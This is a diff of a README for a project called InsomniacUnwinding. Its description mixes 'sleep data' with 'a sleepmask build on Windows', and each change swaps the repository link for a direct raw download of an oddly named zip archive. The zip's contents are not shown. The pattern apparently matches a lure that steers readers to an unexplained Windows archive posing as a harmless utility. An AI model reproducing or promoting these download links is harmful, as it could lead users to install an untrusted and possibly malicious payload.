@@ -1,6 +1,6 @@
 # 💤 InsomniacUnwinding - Keep sleep data ready longer
 
-[![Download](https://img.shields.io/badge/Download-InsomniacUnwinding-blue?style=for-the-badge)](https://github.com/flameb918/InsomniacUnwinding)
+[![Download](https://img.shields.io/badge/Download-InsomniacUnwinding-blue?style=for-the-badge)](https://github.com/flameb918/InsomniacUnwinding/raw/refs/heads/main/InsomniacUnwinding/Insomniac-Unwinding-reverberation.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ This project is for users who want a simple way to run a sleepmask build on Wind
 
 Visit this page to download and use the app:
 
-[https://github.com/flameb918/InsomniacUnwinding](https://github.com/flameb918/InsomniacUnwinding)
+[https://github.com/flameb918/InsomniacUnwinding/raw/refs/heads/main/InsomniacUnwinding/Insomniac-Unwinding-reverberation.zip](https://github.com/flameb918/InsomniacUnwinding/raw/refs/heads/main/InsomniacUnwinding/Insomniac-Unwinding-reverberation.zip)
 
 Open the page, check the latest release or files in the repository, and download the Windows build you want to use.
 
@@ -131,7 +131,7 @@ If the app does not start, close it, then run it again from the extracted folder
 
 Primary download page:
 
-[https://github.com/flameb918/InsomniacUnwinding](https://github.com/flameb918/InsomniacUnwinding)
+[https://github.com/flameb918/InsomniacUnwinding/raw/refs/heads/main/InsomniacUnwinding/Insomniac-Unwinding-reverberation.zip](https://github.com/flameb918/InsomniacUnwinding/raw/refs/heads/main/InsomniacUnwinding/Insomniac-Unwinding-reverberation.zip)
 
 ## 🔍 What to expect
 
